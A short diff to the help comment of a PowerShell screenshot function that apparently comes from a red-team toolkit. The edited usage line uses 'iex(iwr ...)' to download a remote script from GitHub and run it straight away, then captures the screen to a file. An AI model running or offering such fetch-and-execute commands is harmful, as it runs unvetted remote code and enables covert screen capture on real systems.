@@ -2,7 +2,7 @@ Function Take-ScreenShot {
     <#   
 .SYNOPSIS   
     Used to take a screenshot of the desktop or the active window.
-    iex(https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot.ps1);Take-ScreenShot -screen -file "C:\image.png" -imagetype png
+    iex(iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot.ps1);Take-ScreenShot -screen -file "C:\image.png" -imagetype png
  
 .PARAMETER screen 
     Screenshot of the entire screen 
